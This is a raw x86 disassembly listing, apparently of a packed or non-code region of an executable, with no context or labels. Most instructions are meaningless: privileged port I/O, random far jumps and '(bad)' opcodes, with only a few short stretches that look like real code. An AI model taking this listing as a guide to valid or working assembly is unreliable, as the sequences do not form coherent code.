  40b48b:	inc    edx
  40b48c:	ins    BYTE PTR es:[edi],dx
  40b48d:	pop    es
  40b48e:	jmp    0x2329:0x45817e08
  40b495:	mov    WORD PTR [ebx],fs
  40b497:	mov    ecx,0x6e792221
  40b49c:	push   esp
  40b49d:	mov    bl,0x18
  40b49f:	mul    BYTE PTR [edx-0x3bc44411]
  40b4a5:	in     al,0x2a
  40b4a7:	push   ss
  40b4a8:	mov    bl,0xbf
  40b4aa:	popa   
  40b4ab:	mov    esi,0x81571b44
  40b4b0:	nop
  40b4b1:	xor    dl,BYTE PTR [esp+eax*8]
  40b4b4:	enter  0x2d33,0x89
  40b4b8:	xchg   BYTE PTR [edx],bh
  40b4ba:	les    edx,FWORD PTR [ebx+0x6e949fd0]
  40b4c0:	test   BYTE PTR [ebx+0x4f8383a6],bh
  40b4c6:	pop    ebp
  40b4c7:	mov    eax,ds:0xb2d4bcba
  40b4cc:	xchg   ebx,eax
  40b4cd:	mov    bl,0x93
  40b4cf:	popf   
  40b4d0:	loopne 0x40b477
  40b4d2:	inc    esp
  40b4d3:	pop    es
  40b4d4:	clc    
  40b4d5:	repnz xchg esi,eax
  40b4d7:	sbb    al,0x71
  40b4d9:	sbb    eax,0xba575191
  40b4de:	js     0x40b4fe
  40b4e0:	daa    
  40b4e1:	retf   
  40b4e2:	ret    0xf837
  40b4e5:	xchg   edi,eax
  40b4e6:	das    
  40b4e7:	sub    esp,DWORD PTR [eax-0x43]
  40b4ea:	jnp    0x40b49d
  40b4ec:	or     DWORD PTR [esi+edi*2],edi
  40b4ef:	adc    DWORD PTR [ebx+0x7f],ebx
  40b4f2:	jae    0x40b476
  40b4f4:	fstp   QWORD PTR [edi]
  40b4f6:	dec    ebp
  40b4f7:	icebp  
  40b4f8:	stc    
  40b4f9:	pop    ds
  40b4fa:	push   eax
  40b4fb:	fstp   DWORD PTR [ebx-0x7568aa1c]
  40b501:	sub    edi,DWORD PTR [edi+0xa617f10]
  40b507:	mov    WORD PTR [edx+0x7a],cs
  40b50a:	lds    ecx,FWORD PTR [eax+0x7]
  40b50d:	adc    al,0xe8
  40b50f:	fidivr DWORD PTR ds:0xa7fb5270
  40b515:	std    
  40b516:	mov    ah,0x6c
  40b518:	mov    ebx,0xe7c2f72c
  40b51d:	or     BYTE PTR [ebp+eax*2+0x729fbd81],dh
  40b524:	int3   
  40b525:	test   DWORD PTR [edx+edi*1+0x79],ebx
  40b529:	jae    0x40b57f
  40b52b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b52c:	push   edx
  40b52d:	inc    ebx
  40b52e:	int3   
  40b52f:	loope  0x40b502
  40b531:	popf   
  40b532:	adc    DWORD PTR [edi],ebp
  40b534:	dec    esp
  40b535:	aad    0x2b
  40b537:	in     eax,dx
  40b538:	fild   QWORD PTR [ecx-0xf]
  40b53b:	mov    esp,DWORD PTR [ebp+0x4490dcc1]
  40b541:	mov    dl,0x1b
  40b543:	xchg   BYTE PTR ds:0xa34c37d1,dh
  40b549:	and    BYTE PTR [ebx-0x3c967461],0x92
  40b550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b551:	inc    edi
  40b552:	mov    bh,0xa2
  40b554:	pop    esp
  40b555:	in     eax,dx
  40b556:	mov    cl,0x81
  40b558:	dec    esp
  40b559:	xor    BYTE PTR ds:0xb8384e24,ah
  40b55f:	jl     0x40b5c1
  40b561:	xor    BYTE PTR [edx],bh
  40b563:	mov    si,0x7886
  40b567:	repnz rep ins BYTE PTR es:[edi],dx
  40b56a:	retf   0xadc5
  40b56d:	sti    
  40b56e:	(bad)  
  40b56f:	cmp    al,0xc4
  40b571:	sub    al,0x8c
  40b573:	es or  eax,0xd6728804
  40b579:	ins    DWORD PTR es:[edi],dx
  40b57a:	ss add eax,0xb6b1bd2f
  40b580:	icebp  
  40b581:	ret    
  40b582:	stos   BYTE PTR es:[edi],al
  40b583:	mov    ebx,0x9b5b96b3
  40b588:	xchg   esp,eax
  40b589:	scas   eax,DWORD PTR es:[edi]
  40b58a:	mov    al,ds:0x79d87552
  40b58f:	stc    
  40b590:	pop    es
  40b591:	cmp    dh,cl
  40b593:	(bad)  
  40b594:	into   
  40b595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b596:	lahf   
  40b597:	xchg   edx,eax
  40b598:	add    al,0x49
  40b59a:	sbb    BYTE PTR [edx+edx*4],0x0
  40b59e:	retf   
  40b59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a0:	mov    dh,dh
  40b5a2:	addr16 out dx,eax
  40b5a4:	sar    esp,1
  40b5a6:	sbb    DWORD PTR [ecx+0x3d],esp
  40b5a9:	data16 stc 
  40b5ab:	jmp    0x40b615
  40b5ad:	rol    dh,cl
  40b5af:	rcr    al,0xe3
  40b5b2:	cmc    
  40b5b3:	hlt    
  40b5b4:	mov    ds:0xbd945892,al
  40b5b9:	call   0x19a:0x401d0161
  40b5c0:	mov    bl,0xf9
  40b5c2:	cmp    dh,BYTE PTR [ebx]
  40b5c4:	add    DWORD PTR [esi-0x49788a8c],ebx
  40b5ca:	push   edi
  40b5cb:	test   BYTE PTR [ebx-0x15a005b4],0xd2
  40b5d2:	popf   
  40b5d3:	popf   
  40b5d4:	ja     0x40b634
  40b5d6:	push   edx
  40b5d7:	cwde   
  40b5d8:	xchg   ecx,eax
  40b5d9:	addr16 jo 0x40b605
  40b5dc:	jl     0x40b651
  40b5de:	xchg   edi,eax
  40b5df:	xor    edi,DWORD PTR [edi+esi*2+0x1ff66b27]
  40b5e6:	xor    edi,esi
  40b5e8:	and    BYTE PTR [ebp-0x5f8b040],ah
  40b5ee:	in     eax,dx
  40b5ef:	jp     0x40b5a3
  40b5f1:	push   ebp
  40b5f2:	xor    eax,0x79ad929c
  40b5f7:	das    
  40b5f8:	mov    ebp,0x7749d7ca
  40b5fd:	push   ebp
  40b5fe:	orps   xmm6,XMMWORD PTR [edi+ecx*4+0xf29e42b]
  40b606:	cld    
  40b607:	pop    esi
  40b608:	stos   DWORD PTR es:[edi],eax
  40b609:	push   esi
  40b60a:	mov    fs,WORD PTR [ebx]
  40b60c:	bound  ecx,QWORD PTR [edi+edi*8+0x10]
  40b610:	sub    dl,BYTE PTR [ecx-0x1fe3e115]
  40b616:	jmp    0x632d:0xb19e92bd
  40b61d:	test   eax,0x6abd797d
  40b622:	fnstsw WORD PTR [ecx-0x48]
  40b625:	xchg   esi,eax
  40b626:	std    
  40b627:	sbb    BYTE PTR [edi],ah
  40b629:	dec    edx
  40b62a:	sbb    eax,0x88f77b9a
  40b62f:	ins    DWORD PTR es:[edi],dx
  40b630:	into   
  40b631:	mov    eax,0x51ff5b02
  40b636:	das    
  40b637:	xchg   DWORD PTR [edi-0x3e],ebx
  40b63a:	cmp    ah,cl
  40b63c:	jl     0x40b61a
  40b63e:	es and al,0xfb
  40b641:	mov    edx,0x2a101609
  40b646:	jecxz  0x40b643
  40b648:	ds pop es
  40b64a:	push   edx
  40b64b:	mov    eax,0xc40001df
  40b650:	jno    0x40b5ec
  40b652:	imul   esi,DWORD PTR [esi+eiz*2],0x7096d0f9
  40b659:	shl    BYTE PTR [esi+edi*4-0x785e6099],cl
  40b660:	hlt    
  40b661:	mov    ecx,0xe7382c2e
  40b666:	inc    DWORD PTR [ecx-0x663f8bff]
  40b66c:	in     eax,dx
  40b66d:	mov    edx,0x48fc32c5
  40b672:	clc    
  40b673:	lods   eax,DWORD PTR ds:[esi]
  40b674:	out    0x9,eax
  40b676:	dec    ecx
  40b677:	sbb    eax,DWORD PTR [edx+edi*8]
  40b67a:	sti    
  40b67b:	sti    
  40b67c:	xor    BYTE PTR [edi],bl
  40b67e:	push   es
  40b67f:	ret    0x931f
  40b682:	adc    dl,BYTE PTR [ecx-0x20ff3d13]
  40b688:	xchg   BYTE PTR [edi],dl
  40b68a:	pop    ds
  40b68b:	leave  
  40b68c:	not    DWORD PTR [ebp+0x3e]
  40b68f:	adc    esi,DWORD PTR [ecx-0x5]
  40b692:	test   DWORD PTR [eax],0xe52d58f6
  40b698:	out    0xe0,al
  40b69a:	pop    esp
  40b69b:	lahf   
  40b69c:	dec    ebx
  40b69d:	fdiv   QWORD PTR [eax+0x21]
  40b6a0:	mov    ebp,0xa7b7073a
  40b6a5:	and    eax,0x6ab0f0cd
  40b6aa:	xor    DWORD PTR ds:0xfc8c929,eax
  40b6b0:	test   BYTE PTR [eax-0x6],ah
  40b6b3:	sbb    al,0x52
  40b6b5:	pop    esp
  40b6b6:	push   bp
  40b6b8:	loop   0x40b6f6
  40b6ba:	jno    0x40b6b0
  40b6bc:	cmp    DWORD PTR [eax],esp
  40b6be:	test   ecx,eax
  40b6c0:	repz dec DWORD PTR [edi-0x30de3b44]
  40b6c7:	(bad)  
  40b6c9:	shl    BYTE PTR [edi+0x7f],1
  40b6cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6cd:	in     eax,0xcd
  40b6cf:	rcl    dl,0xc
  40b6d2:	test   eax,0x5663bd57
  40b6d7:	dec    ebp
  40b6d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d9:	pop    ebp
  40b6da:	cli    
  40b6db:	xchg   esi,eax
  40b6dc:	jmp    0x40b667
  40b6de:	add    al,0xfc
  40b6e0:	sbb    DWORD PTR [eax-0x47682874],ebp
  40b6e6:	mov    DWORD PTR [ecx+0x2b],ecx
  40b6e9:	mov    dl,0x69
  40b6eb:	mov    dh,0xa3
  40b6ed:	mov    bh,0xdf
  40b6ef:	fcmovnbe st,st(3)
  40b6f1:	pop    ds
  40b6f2:	int3   
  40b6f3:	push   eax
  40b6f4:	mov    DWORD PTR [ecx],eax
  40b6f6:	jmp    0x40c082
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [esi+ebx*4+0x1d],?
  40b71b:	or     BYTE PTR [eax+edi*8],dl
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	cmp    bh,bl
  40b726:	shr    bl,cl
  40b728:	inc    ebx
  40b729:	and    eax,0xf45eb710
  40b72e:	fadd   st(4),st
  40b730:	leave  
  40b731:	and    DWORD PTR [esi-0x10],esp
  40b734:	cs mov bh,0xd3
  40b737:	int    0x31
  40b739:	clc    
  40b73a:	es or  ebp,edi
  40b73d:	xor    eax,0x53cbeffb
  40b742:	lock add ch,dh
  40b745:	push   eax
  40b746:	xlat   BYTE PTR ds:[ebx]
  40b747:	retf   
  40b748:	dec    ecx
  40b749:	jb     0x40b703
  40b74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b74c:	test   DWORD PTR [edi+0x5e673ee8],ebp
  40b752:	std    
  40b753:	and    eax,0x6f1c7b1b
  40b758:	mov    BYTE PTR [eax-0x6f8a7358],dh
  40b75e:	sbb    ah,BYTE PTR [ebx]
  40b760:	lods   eax,DWORD PTR ds:[esi]
  40b761:	mov    dl,0xd1
  40b763:	scas   eax,DWORD PTR es:[edi]
  40b764:	(bad)  
  40b765:	jmp    0x40b7ab
  40b767:	shr    BYTE PTR [ebp-0x4cb1089b],cl
  40b76d:	pop    edi
  40b76e:	sub    al,BYTE PTR [esi-0x78]
  40b771:	mov    ch,0x20
  40b773:	jno    0x40b7e2
  40b775:	xchg   ebx,eax
  40b776:	stos   DWORD PTR es:[edi],eax
  40b777:	dec    eax
  40b778:	xor    BYTE PTR [ebx],cl
  40b77a:	outs   dx,BYTE PTR ds:[esi]
  40b77b:	jbe    0x40b756
  40b77d:	imul   cl
  40b77f:	scas   eax,DWORD PTR es:[edi]
  40b780:	mov    al,ds:0x4b947bd9
  40b785:	mov    edx,0xe16f5ec0
  40b78a:	xchg   esi,eax
  40b78b:	mov    ?,WORD PTR [ecx]
  40b78d:	dec    ecx
  40b78e:	jmp    0x2c5dfd0b
  40b793:	add    eax,0x77411121
  40b798:	aaa    
  40b799:	out    0x55,eax
  40b79b:	xchg   edx,eax
  40b79c:	push   DWORD PTR [ebx+eax*8-0x4e76a64e]
  40b7a3:	lock into 
  40b7a5:	mov    al,0xa1
  40b7a7:	out    dx,al
  40b7a8:	xchg   DWORD PTR [ebp+0x34],esi
  40b7ab:	sbb    ch,BYTE PTR [eax-0x43]
  40b7ae:	mov    bl,0xc2
  40b7b0:	or     BYTE PTR [ebp-0x52],bl
  40b7b3:	ror    DWORD PTR [edi+edi*4-0x3c],cl
  40b7b7:	xchg   ebp,eax
  40b7b8:	adc    edx,eax
  40b7ba:	cwde   
  40b7bb:	sbb    dh,BYTE PTR [ebx+0x62515185]
  40b7c1:	pop    esp
  40b7c2:	out    dx,al
  40b7c3:	leave  
  40b7c4:	fisttp QWORD PTR [ebx+ebx*1-0xa]
  40b7c8:	out    0x3d,eax
  40b7ca:	mov    bh,0xc8
  40b7cc:	sbb    ch,BYTE PTR [ebx+0xa]
  40b7cf:	xor    al,0x1f
  40b7d1:	jp     0x40b82a
  40b7d3:	ja     0x40b7b8
  40b7d5:	add    DWORD PTR [ecx+0x53e7a99f],0xffffff9c
  40b7dc:	ss jno 0x40b806
  40b7df:	sti    
  40b7e0:	ds inc ecx
  40b7e2:	and    BYTE PTR [ebx],ch
  40b7e4:	repz sbb BYTE PTR [ebx],bl
  40b7e7:	out    0x4e,eax
  40b7e9:	push   ecx
  40b7ea:	push   es
  40b7eb:	cmp    bl,0x45
  40b7ee:	fbstp  TBYTE PTR [edx+ebp*2]
  40b7f1:	jmp    0xd5a34b3b
  40b7f6:	xchg   ebx,eax
  40b7f7:	sub    BYTE PTR [ebx+0x14],bh
  40b7fa:	pop    ebp
  40b7fb:	pusha  
  40b7fc:	out    0xcf,eax
  40b7fe:	test   DWORD PTR [eax-0xe],ebx
  40b801:	test   al,0xed
  40b803:	jb     0x40b814
  40b805:	adc    bl,BYTE PTR ds:0xaed82f67
  40b80b:	dec    esi
  40b80c:	inc    edi
  40b80d:	dec    edx
  40b80e:	adc    edi,eax
  40b810:	into   
  40b811:	lods   al,BYTE PTR ds:[esi]
  40b812:	push   cs
  40b813:	sub    esi,0x98c18884
  40b819:	ins    BYTE PTR es:[edi],dx
  40b81a:	shl    esi,0xb1
  40b81d:	je     0x40b85b
  40b81f:	icebp  
  40b820:	aad    0xcb
  40b822:	mov    eax,ds:0x8cfeafbf
  40b827:	add    cl,dl
  40b829:	(bad)  es:[ecx+0x41a223a8]
  40b830:	and    eax,0xbc2ccb00
  40b835:	cmp    DWORD PTR [eax-0x73],ecx
  40b838:	int    0x48
  40b83a:	shl    BYTE PTR [ebx-0x422d72d],1
  40b840:	pop    eax
  40b841:	jmp    0x729f:0xd7733454
  40b848:	xchg   esp,eax
  40b849:	or     DWORD PTR [ecx-0x20d17042],eax
  40b84f:	jns    0x40b7fa
  40b851:	pop    ds
  40b852:	pop    edx
  40b853:	pushf  
  40b854:	arpl   WORD PTR [ebp-0x41a59ef8],bp
  40b85a:	pushf  
  40b85b:	mov    esp,0x49597d1e
  40b860:	scas   eax,DWORD PTR es:[edi]
  40b861:	outs   dx,BYTE PTR ds:[esi]
  40b862:	lods   al,BYTE PTR ds:[esi]
  40b863:	inc    edx
  40b864:	aas    
  40b865:	sbb    DWORD PTR [edi-0x6],ebp
  40b868:	jp     0x40b8c2
  40b86a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b86b:	rcr    BYTE PTR [eax-0x104accdb],1
  40b871:	daa    
  40b872:	mov    bh,0xaa
  40b874:	out    dx,al
  40b875:	mov    eax,DWORD PTR [edi]
  40b877:	xchg   ecx,eax
  40b878:	cld    
  40b879:	push   ds
  40b87a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b87b:	jmp    0xfb1a:0x8f54f257
  40b882:	mov    eax,ds
  40b884:	lea    eax,[esi]
  40b886:	sub    bh,BYTE PTR [eax-0x56ce40cf]
  40b88c:	add    eax,DWORD PTR [ebx+0x774c48f4]
  40b892:	mov    esi,edx
  40b894:	leave  
  40b895:	dec    esi
  40b896:	pop    ss
  40b897:	cmp    ecx,edx
  40b899:	fwait
  40b89a:	test   eax,0xc5c65c61
  40b89f:	arpl   si,cx
  40b8a1:	mov    eax,ds:0x38c7ec69
  40b8a6:	cmp    dl,BYTE PTR [edi-0x7e]
  40b8a9:	and    bh,BYTE PTR [ecx]
  40b8ab:	imul   BYTE PTR ds:0x3c8fa6b0
  40b8b1:	ss xchg ebp,eax
  40b8b3:	call   0xc42d6eff
  40b8b8:	(bad)  
  40b8b9:	jno    0x40b912
  40b8bb:	lds    edi,FWORD PTR [edx-0x10edde5d]
  40b8c1:	test   al,0x7c
  40b8c3:	add    esp,DWORD PTR [ebx]
  40b8c5:	mov    ch,0x39
  40b8c7:	jne    0x40b8b2
  40b8c9:	mul    DWORD PTR [ecx]
  40b8cb:	xchg   ebx,eax
  40b8cc:	sbb    bh,BYTE PTR [edi+0x56]
  40b8cf:	adc    BYTE PTR [edx-0x7f],0x45
  40b8d3:	pop    eax
  40b8d4:	gs sbb eax,0x24391441
  40b8da:	popa   
  40b8db:	loop   0x40b8c1
  40b8dd:	call   0xd442:0xf5f29b6e
  40b8e4:	xchg   edx,eax
  40b8e5:	mov    ah,0x74
  40b8e7:	test   eax,0x5f357199
  40b8ec:	mov    esp,0xfaa954da
  40b8f1:	add    ebp,DWORD PTR [esi-0x7a]
  40b8f4:	shl    BYTE PTR [ebp-0x23],cl
  40b8f7:	push   ebp
  40b8f8:	mov    al,ds:0xde15c91d
  40b8fd:	mov    bl,0xaf
  40b8ff:	sbb    BYTE PTR [edx+ebx*1+0x28],cl
  40b903:	mov    bl,0xe
  40b905:	mov    ?,WORD PTR [edi+0x6eca979a]
  40b90b:	cmp    al,0x42
  40b90d:	clc    
  40b90e:	jmp    0x70e2:0x88c023a1
  40b915:	not    DWORD PTR [eax+ebx*8]
  40b918:	push   edx
  40b919:	(bad)  
  40b91a:	das    
  40b91b:	mov    al,0x25
  40b91d:	sub    cl,al
  40b91f:	jnp    0x40b8c6
  40b921:	pop    ss
  40b922:	mov    ah,0x5d
  40b924:	push   esp
  40b925:	sbb    DWORD PTR [ebx+0xb3d0d2c],esp
  40b92b:	sahf   
  40b92c:	cld    
  40b92d:	ins    DWORD PTR es:[edi],dx
  40b92e:	aam    0x71
  40b930:	cli    
  40b931:	aas    
  40b932:	inc    ebx
  40b933:	sbb    BYTE PTR [eax+0x577e4951],ah
  40b939:	repnz scas al,BYTE PTR es:[edi]
  40b93b:	xchg   ebx,eax
  40b93c:	mov    edx,0xb6f87b
  40b941:	in     al,dx
  40b942:	je     0x40b979
  40b944:	xchg   ebp,eax
  40b945:	push   0xccb47ef6
  40b94a:	mov    dl,0x97
  40b94c:	outs   dx,DWORD PTR ds:[esi]
  40b94d:	add    dh,0x8b
  40b950:	pusha  
  40b951:	or     al,0x31
  40b954:	rcl    ebp,1
  40b956:	aam    0xd9
  40b958:	sbb    cl,ah
  40b95a:	inc    ecx
  40b95b:	xor    edi,DWORD PTR [edi+0x6f]
  40b95e:	sub    al,0xb2
  40b960:	inc    ebp
  40b961:	add    dl,dl
  40b963:	scas   al,BYTE PTR es:[edi]
  40b964:	outs   dx,DWORD PTR ds:[esi]
  40b965:	shl    DWORD PTR [eax+eax*4+0x4dfc9d47],1
  40b96c:	pushf  
  40b96d:	cdq    
  40b96e:	add    al,0xbc
  40b970:	fisttp QWORD PTR [ebp-0x6]
  40b973:	sbb    ebx,DWORD PTR ds:0x31897016
  40b979:	stos   BYTE PTR es:[edi],al
  40b97a:	dec    ecx
  40b97b:	sub    DWORD PTR [edx+0x4d8a37c3],0x3d2b7d91
  40b985:	xor    ecx,edi
  40b987:	mov    ch,0x41
  40b989:	mov    ds:0xe744500f,al
  40b98e:	mov    cl,0x64
  40b990:	mov    dh,0x8f
  40b992:	test   eax,0x2ecf3800
  40b997:	dec    esp
  40b998:	inc    esi
  40b999:	mov    al,ds:0xe07e3993
  40b99e:	mov    eax,ds:0xbb3c839
  40b9a3:	popf   
  40b9a4:	adc    al,0xcc
  40b9a6:	mov    esp,0xf29b6405
  40b9ab:	push   ss
  40b9ac:	stc    
  40b9ad:	outs   dx,BYTE PTR ds:[esi]
  40b9ae:	fcomi  st,st(2)
  40b9b0:	repnz mov ebp,esi
  40b9b3:	fiadd  DWORD PTR [edi+0x2d]
  40b9b6:	sahf   
  40b9b7:	fisubr WORD PTR [ebx+edi*8]
  40b9ba:	inc    esp
  40b9bb:	loopne 0x40ba28
  40b9bd:	jo     0x40b9c5
  40b9bf:	xchg   ecx,eax
  40b9c0:	loop   0x40ba3d
  40b9c2:	jl     0x40ba1b
  40b9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9c5:	xchg   edi,eax
  40b9c6:	sub    bl,BYTE PTR fs:[edx+0x26d7ec2]
  40b9cd:	sub    esi,ebx
  40b9cf:	test   bh,bh
  40b9d1:	or     BYTE PTR [eax+0x4a7b85aa],bl
  40b9d7:	jecxz  0x40b9d4
  40b9d9:	sbb    BYTE PTR [eax+0x1777b19e],0xef
  40b9e0:	fnstcw WORD PTR [eax+0x5]
  40b9e3:	and    BYTE PTR ds:0x7b9844e4,0xad
  40b9ea:	out    0x1e,al
  40b9ec:	aaa    
  40b9ed:	scas   al,BYTE PTR es:[edi]
  40b9ee:	mov    edx,0x88d1fcad
  40b9f3:	rcr    esi,cl
  40b9f5:	or     al,0xeb
  40b9f7:	xlat   BYTE PTR ds:[ebx]
  40b9f8:	pop    ds
  40b9f9:	(bad)  
  40b9fa:	les    edi,FWORD PTR fs:[eax]
  40b9fd:	inc    ebx
  40b9fe:	div    DWORD PTR [edi]
  40ba00:	arpl   cx,ax
  40ba02:	and    DWORD PTR [eax+0x74],esp
  40ba05:	scas   eax,DWORD PTR es:[edi]
  40ba06:	inc    edx
  40ba07:	xor    eax,0xcaf0a3fc
  40ba0c:	adc    esp,DWORD PTR [eax-0xe]
  40ba0f:	gs test eax,0x7c5e632e
  40ba15:	and    DWORD PTR [ebx+0x63],ebp
  40ba18:	loope  0x40ba4b
  40ba1a:	jl     0x40ba05
  40ba1c:	imul   eax,DWORD PTR [esi-0x40f4e8c1],0x42
  40ba23:	nop
  40ba24:	xlat   BYTE PTR ds:[ebx]
  40ba25:	sbb    BYTE PTR [ecx-0x31],dh
  40ba28:	mov    eax,DWORD PTR [ebp-0x8]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    al,BYTE PTR [ecx]
  40ba40:	or     esi,DWORD PTR [eax+0x7e8710a1]
  40ba46:	jle    0x40bac2
  40ba48:	jge    0x40bac8
  40ba4a:	jle    0x40ba6a
  40ba4c:	(bad)  
  40ba4d:	fmul   st,st(3)
  40ba4f:	out    dx,al
  40ba50:	or     al,0xad
  40ba52:	ret    
  40ba53:	jb     0x40b9ec
  40ba55:	adc    ch,ah
  40ba57:	and    ebp,DWORD PTR [ecx+0x4020753e]
  40ba5d:	aad    0xf7
  40ba5f:	adc    ebx,esi
  40ba61:	lods   eax,DWORD PTR ds:[esi]
  40ba62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba63:	pop    ds
  40ba64:	mov    esp,0xe7b95c4
  40ba69:	icebp  
  40ba6a:	test   BYTE PTR [esi+0x13c17af],al
  40ba70:	jae    0x40ba13
  40ba72:	xchg   ebp,eax
  40ba73:	add    BYTE PTR [ebx-0x449b225e],ch
  40ba79:	mov    ebp,ecx
  40ba7b:	ror    bl,1
  40ba7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba7e:	outs   dx,DWORD PTR ds:[esi]
  40ba7f:	sti    
  40ba80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba81:	rol    BYTE PTR [ebx+0x24],0x41
  40ba85:	push   es
  40ba86:	scas   eax,DWORD PTR es:[edi]
  40ba87:	xchg   edx,eax
  40ba88:	pop    ebp
  40ba89:	push   ebx
  40ba8a:	and    DWORD PTR [esi*8+0x2d35887c],ecx
  40ba91:	pop    ss
  40ba92:	sbb    BYTE PTR [ebp+ebx*2+0x3b],0x6d
  40ba97:	pop    esi
  40ba98:	mov    eax,ds:0xf56cc7fc
  40ba9d:	rol    BYTE PTR [ecx-0x4d927993],cl
  40baa3:	sbb    eax,DWORD PTR [eax+ebx*4-0xd338ebf]
  40baaa:	push   eax
  40baab:	pop    edx
  40baac:	mov    al,0xce
  40baae:	(bad)  
  40baaf:	jle    0x40ba8d
  40bab1:	std    
  40bab2:	leave  
  40bab3:	xor    al,0x4
  40bab5:	push   edi
  40bab6:	adc    DWORD PTR [eax-0x1f],0xe3a8713a
  40babd:	(bad)  
  40babe:	sti    
  40babf:	jge    0x40ba52
  40bac1:	retf   
  40bac2:	sbb    dl,dl
  40bac4:	leave  
  40bac5:	pop    ebp
  40bac6:	es mov al,0xb0
  40bac9:	or     eax,edi
  40bacb:	aas    
  40bacc:	loop   0x40ba6f
  40bace:	fst    DWORD PTR [edi+0x27]
  40bad1:	pop    esi
  40bad2:	jo     0x40ba85
  40bad4:	sub    al,0x48
  40bad6:	lods   al,BYTE PTR ss:[esi]
  40bad8:	aas    
  40bad9:	mov    WORD PTR ss:[ebx],cs
  40badc:	int    0xdd
  40bade:	in     eax,0xd8
  40bae0:	shl    eax,1
  40bae2:	jp     0x40bb3e
  40bae4:	pop    edx
  40bae5:	scas   eax,DWORD PTR es:[edi]
  40bae6:	outs   dx,DWORD PTR ds:[esi]
  40bae7:	out    dx,eax
  40bae8:	rcl    BYTE PTR [ebx+0x23],0xcd
  40baec:	cmp    DWORD PTR [ebp+esi*4-0x59],esp
  40baf0:	xchg   esp,eax
  40baf1:	pop    ss
  40baf2:	leave  
  40baf3:	inc    esp
  40baf4:	mov    bl,0x9f
  40baf6:	sub    DWORD PTR [esi-0x6],esp
  40baf9:	lods   eax,DWORD PTR ds:[esi]
  40bafa:	test   DWORD PTR [edi],eax
  40bafc:	js     0x40bb34
  40bafe:	push   ecx
  40baff:	push   ecx
  40bb00:	xlat   BYTE PTR ds:[ebx]
  40bb01:	ds std 
  40bb03:	stos   BYTE PTR es:[edi],al
  40bb04:	lahf   
  40bb05:	sub    DWORD PTR [esi+0x1aa74e49],edi
  40bb0b:	outs   dx,BYTE PTR ds:[esi]
  40bb0c:	and    al,BYTE PTR [ebx]
  40bb0e:	sbb    eax,0x2ca6071b
  40bb13:	cmp    dh,al
  40bb15:	and    eax,0xbfbe0acf
  40bb1a:	ret    0x57f7
  40bb1d:	pop    edx
  40bb1e:	inc    ebx
  40bb1f:	addr16 inc edx
  40bb21:	iret   
  40bb22:	cdq    
  40bb23:	mov    DWORD PTR [eax+ebp*8],ecx
  40bb26:	into   
  40bb27:	inc    ecx
  40bb28:	les    esi,FWORD PTR [ebp-0x75]
  40bb2b:	xchg   esp,eax
  40bb2c:	add    DWORD PTR [ebp+0x35],eax
  40bb2f:	iret   
  40bb30:	cmc    
  40bb31:	test   eax,0x8482053
  40bb36:	inc    esi
  40bb37:	dec    esp
  40bb38:	push   ds
  40bb39:	nop
  40bb3a:	call   0xfc0702e
  40bb3f:	inc    ebx
  40bb40:	adc    ah,BYTE PTR [ebx+0x5a]
  40bb43:	lods   eax,DWORD PTR ds:[esi]
  40bb44:	cmc    
  40bb45:	mov    al,0x40
  40bb47:	ins    DWORD PTR es:[edi],dx
  40bb48:	add    eax,0x55ce5447
  40bb4d:	(bad)  
  40bb4e:	imul   edi,DWORD PTR [ebx+0x14],0xc763aa25
  40bb55:	add    DWORD PTR [ecx+esi*1+0xd083f44],esi
  40bb5c:	add    eax,0x3bed73c
  40bb61:	or     BYTE PTR [ecx+0x6d],cl
  40bb64:	inc    esi
  40bb65:	xchg   ebp,eax
  40bb66:	fiadd  WORD PTR [edi+0x63]
  40bb69:	and    DWORD PTR ds:0x323ba935,0xc4fb95b4
  40bb73:	das    
  40bb74:	push   0x1a
  40bb76:	jmp    0x40bb7a
  40bb78:	inc    esp
  40bb79:	sub    cl,0x3b
  40bb7c:	aas    
  40bb7d:	hlt    
  40bb7e:	cwde   
  40bb7f:	add    ch,al
  40bb81:	daa    
  40bb82:	(bad)  
  40bb83:	in     al,0x95
  40bb85:	pop    edi
  40bb86:	xchg   edx,eax
  40bb87:	jne    0x40bb69
  40bb89:	call   0xbdfd3094
  40bb8e:	dec    edx
  40bb8f:	mov    al,0x77
  40bb91:	cmp    cl,BYTE PTR [edi-0x29]
  40bb94:	mov    ds:0xb984de8e,eax
  40bb99:	adc    bl,BYTE PTR [edi+0x16]
  40bb9c:	dec    edx
  40bb9d:	(bad)  
  40bb9e:	cdq    
  40bb9f:	add    al,0x3b
  40bba1:	out    0x51,al
  40bba3:	pushf  
  40bba4:	cli    
  40bba5:	frstor [edi]
  40bba7:	nop
  40bba8:	data16 out 0x14,al
  40bbab:	adc    eax,0xcc7b62e8
  40bbb0:	push   esi
  40bbb1:	mov    edi,0xab2738d4
  40bbb6:	(bad)  
  40bbb7:	cmp    al,0x11
  40bbb9:	fld1   
  40bbbb:	push   ebx
  40bbbc:	jp     0x40bc3a
  40bbbe:	inc    ecx
  40bbbf:	cdq    
